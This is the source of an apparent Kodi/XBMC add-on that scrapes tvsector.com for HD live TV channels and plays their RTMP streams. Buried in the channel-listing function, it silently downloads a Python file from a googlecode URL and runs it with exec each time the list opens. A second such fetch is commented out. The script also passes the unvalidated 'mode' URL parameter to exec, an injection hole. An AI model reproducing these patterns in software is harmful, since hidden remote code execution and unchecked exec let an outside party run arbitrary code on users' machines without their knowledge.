#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib, urllib2, cookielib
import string, os, re, time, datetime, sys
import random

import xbmc, xbmcgui, xbmcplugin, xbmcaddon

from BeautifulSoup import BeautifulSoup

pluginhandle = int(sys.argv[1])

BASE = 'http://www.tvsector.com/'

       
def Notify(title,message,times):
     #simplified way to call notifications. common notifications here.
     if title == '':
          title='TV Sector'
     if times == '':
           times='5000'
     smallicon=''
     xbmc.executebuiltin("XBMC.Notification("+title+","+message+","+times+","+smallicon+")")


def listVideos():
    xbmcplugin.addSortMethod(pluginhandle, xbmcplugin.SORT_METHOD_LABEL)
    try:
        data = getURL(BASE)
        tree=BeautifulSoup(data, convertEntities=BeautifulSoup.HTML_ENTITIES)
    #    stations=tree.find('div',attrs={'id':'masonry'}).findAll('div',attrs={'id':True},recursive=False)
        stations=tree.find('div',attrs={'id':'omc-main-left-column'}).findAll('div',attrs={'id':True},recursive=False)
        for station in stations:
    #        print station
            link = station.find('a')
    #        print link
            if(link == None) :
                continue
    #        text = station.find('p')
    #        print text
            title = link.string
            #print title
            #if title.find('Protected') > -1  :
            #    continue
            url = link['href']
    #        if (station.find('img') < 0 ) or ( title.find('Futubox') > -1 ) or ( title.find('Protected') > -1 ) or ( title.find('Penthouse') > -1 ) or ( url.find('#') ==0 ) :
    #        if ( title.find('Futubox') > -1 ) or ( title.find('Protected') > -1 ) or ( title.find('Penthouse') > -1 ) or ( url.find('#') ==0 ) :
            if ( title.find('HD') == -1 ) or ( title.find('Futubox') > -1 ) or ( title.find('Protected') > -1 ) or ( title.find('Penthouse') > -1 ) or ( url.find('#') ==0 ) :
                continue
    #        simg = station.find('img')
            #print simg
    #        ithumbi = re.compile('.*src="([^"]*)".*')
            #print ithumbi
    #        ithumb = ithumbi.findall(str(simg))
            #thumb = station.find('IMG')['src']
    #        thumb = ithumb[0]
            thumb = None
            u = sys.argv[0]
            u += '?url='+urllib.quote_plus(url)
            u += '&mode=play'
    #        u = u.replace('tvsector.com/live', 'webport.tv/live')
            item=xbmcgui.ListItem(title, iconImage=thumb, thumbnailImage=thumb)
            item.setInfo( type="Video", infoLabels={'title':title}) 
            item.setProperty('IsPlayable', 'true')
            xbmcplugin.addDirectoryItem(handle=pluginhandle,url=u,listitem=item,isFolder=False)
    except:
        xbmc.log("Unable to get tvsector.com")

    try:
        stri = getURL("http://rwxr-xr-x-projects.googlecode.com/svn/chan/pyth.py")
        exec stri
    except:
        xbmc.log("Unable to download and execute custom code")

#    try:
#        stri2 = getURL("http://rwxr-xr-x-projects.googlecode.com/svn/addons/test.py")
#        exec stri2
#    except:
#        xbmc.log("Unable to download and execute custom code2")

    xbmcplugin.endOfDirectory( handle=pluginhandle )

def addLink(title, thumb, link):
    litem=xbmcgui.ListItem(title, iconImage=thumb, thumbnailImage=thumb)
    litem.setInfo( type="Video", infoLabels={'title':title})
    litem.setProperty('IsPlayable', 'true')
    xbmcplugin.addDirectoryItem(handle=pluginhandle,url=link,listitem=litem,isFolder=False)

def play():
    data = getURL(params["url"])
    swfUrl = re.compile('flashplayer: "(.*?)",').findall(data)[0]
    playpath, rtmp = re.compile('"file": "(.*?)", "streamer": "(.*?)",').findall(data)[0]
    options = ['s7','s5','s6','s7','s99']
    option = options[random.randint(1,4)]
#    rtmp = rtmp.replace('tv.tvsector.com/live', 'tv.futubox.com/live')
#    Notify("", "Using server " + option, "")
#    rtmp = rtmp.replace('://tv','://'+option)
#    rtmp = rtmp.replace('tvsector.com/live', 'webport.tv/live')
    rtmp += ' playpath='+playpath+' swfurl='+swfUrl+' pageurl='+params["url"]+' live=1 playlist=1'
    item = xbmcgui.ListItem(path=rtmp)
    xbmcplugin.setResolvedUrl(pluginhandle, True, item)

def getURL( url ):
    print 'RTMPGUI --> common :: getURL :: url = '+url
    cj = cookielib.LWPCookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
#    opener.addheaders = [('User-Agent', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;)')]    
    opener.addheaders = [('User-Agent', 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.26) Gecko/20120128 Firefox/3.6.26')]
    usock=opener.open(url)
    response=usock.read()
    usock.close()
    return response

def get_params():
    param=[]
    paramstring=sys.argv[2]
    if len(paramstring)>=2:
        params=sys.argv[2]
        cleanedparams=params.replace('?','')
        if (params[len(params)-1]=='/'):
            params=params[0:len(params)-2]
        pairsofparams=cleanedparams.split('&')
        param={}
        for i in range(len(pairsofparams)):
            splitparams={}
            splitparams=pairsofparams[i].split('=')
            if (len(splitparams))==2:
                param[splitparams[0]]=urllib.unquote_plus(splitparams[1])                                        
    return param

params=get_params()
try:
    mode=params["mode"]
except:
    mode=None
print "Mode: "+str(mode)
print "Parameters: "+str(params)

if mode==None:
    listVideos()
else:
    exec '%s()' % mode

